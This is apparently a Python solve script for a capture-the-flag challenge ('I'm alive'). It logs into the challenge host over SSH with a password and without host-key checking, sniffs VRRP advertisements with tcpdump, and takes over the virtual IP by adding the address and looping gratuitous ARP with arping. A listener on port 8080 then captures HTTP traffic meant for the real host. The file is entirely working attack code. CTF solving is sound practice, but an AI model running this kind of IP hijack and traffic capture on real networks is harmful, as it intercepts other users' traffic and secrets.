#!/usr/bin/env python3
import argparse
import re
import shlex
import time

import pexpect


PASSWORD_PROMPT = re.compile(r"(?i)password:")
FLAG_RE = re.compile(r"HCMUS-CTF\{[^}]+\}")
VRRP_RE = re.compile(
    r"VRRPv2, Advertisement, vrid (\d+), prio (\d+).*addrs: ([0-9.]+) auth \"([^\"]*)\""
)


def ssh_command(host: str, port: int, password: str, remote_cmd: str, timeout: int) -> str:
    ssh_cmd = (
        "ssh -4 "
        "-o PreferredAuthentications=password "
        "-o PubkeyAuthentication=no "
        "-o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/tmp/im_alive_known_hosts "
        f"-p {port} root@{host} {shlex.quote(remote_cmd)}"
    )
    child = pexpect.spawn(ssh_cmd, encoding="utf-8", timeout=timeout)
    idx = child.expect([PASSWORD_PROMPT, pexpect.EOF, pexpect.TIMEOUT])
    if idx == 0:
        child.sendline(password)
        idx = child.expect([pexpect.EOF, pexpect.TIMEOUT])
        if idx != 0:
            child.close(force=True)
            raise RuntimeError("ssh command timed out after authentication")
        output = child.before
    elif idx == 1:
        output = child.before
    else:
        child.close(force=True)
        raise RuntimeError("ssh command timed out before authentication")
    child.close()
    return output


def discover_vrrp(host: str, port: int, password: str, deadline: int) -> dict[str, str]:
    end = time.time() + deadline
    last_output = ""
    while time.time() < end:
        output = ssh_command(
            host,
            port,
            password,
            "timeout 6 tcpdump -i eth0 -nn -c 1 -vv proto 112 2>&1 || true",
            timeout=20,
        )
        last_output = output
        match = VRRP_RE.search(output)
        if match:
            vrid, priority, vip, auth = match.groups()
            return {"vrid": vrid, "priority": priority, "vip": vip, "auth": auth, "raw": output}
        time.sleep(2)
    raise RuntimeError(f"failed to capture a VRRP advertisement:\n{last_output}")


def capture_flag(host: str, port: int, password: str, vip: str, wait_seconds: int) -> str:
    remote_cmd = f"""
rm -f /tmp/im_alive_http.log /tmp/im_alive_garp.log /tmp/im_alive_garp.pid
ip addr add {vip}/24 dev eth0 2>/dev/null || true
sh -c 'while true; do arping -A -c 1 -I eth0 {vip} >/dev/null 2>&1; sleep 1; done' >/tmp/im_alive_garp.log 2>&1 &
echo $! >/tmp/im_alive_garp.pid
python3 -u - <<'PYS' >/tmp/im_alive_http.log 2>&1 &
import socket
import time

HOST = {vip!r}
PORT = 8080

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(128)
s.settimeout(1)
print("LISTENING", HOST, PORT, flush=True)
end = time.time() + {wait_seconds}
seen = 0
while time.time() < end:
    try:
        conn, addr = s.accept()
    except socket.timeout:
        continue
    seen += 1
    print(f"--- CONN {{seen}} {{addr}} ---", flush=True)
    conn.settimeout(1)
    data = b""
    while True:
        try:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
        except socket.timeout:
            break
    print(data.decode("utf-8", "replace"), flush=True)
    body = b"OK\\n"
    response = (
        b"HTTP/1.1 200 OK\\r\\n"
        b"Content-Type: text/plain\\r\\n"
        b"Content-Length: 3\\r\\n"
        b"Connection: close\\r\\n\\r\\n"
        + body
    )
    try:
        conn.sendall(response)
    except Exception:
        pass
    conn.close()
    if seen >= 10:
        break
s.close()
print("DONE", flush=True)
PYS
sleep {wait_seconds}
kill "$(cat /tmp/im_alive_garp.pid)" >/dev/null 2>&1 || true
sleep 1
sed -n '1,260p' /tmp/im_alive_http.log
ip addr del {vip}/24 dev eth0 2>/dev/null || true
"""
    return ssh_command(host, port, password, remote_cmd, timeout=wait_seconds + 30)


def main() -> None:
    parser = argparse.ArgumentParser(description="Solve HCMUS CTF pwn/I'm alive")
    parser.add_argument("--host", default="chall.blackpinker.com")
    parser.add_argument("--port", type=int, default=20374)
    parser.add_argument("--password", default="HCMUSCTF")
    parser.add_argument(
        "--boot-wait",
        type=int,
        default=240,
        help="max seconds to wait for the first VRRP advertisement",
    )
    parser.add_argument(
        "--capture-wait",
        type=int,
        default=12,
        help="seconds to keep the fake VIP listener alive",
    )
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    info = discover_vrrp(args.host, args.port, args.password, args.boot_wait)
    print(
        f"[+] VRRP: vrid={info['vrid']} priority={info['priority']} vip={info['vip']} auth={info['auth']}"
    )

    output = capture_flag(
        args.host,
        args.port,
        args.password,
        info["vip"],
        args.capture_wait,
    )
    flag_match = FLAG_RE.search(output)
    if not flag_match:
        if args.verbose:
            print(output)
        raise SystemExit("flag not found in captured traffic")

    if args.verbose:
        print(output)
    print(f"[+] Flag: {flag_match.group(0)}")


if __name__ == "__main__":
    main()
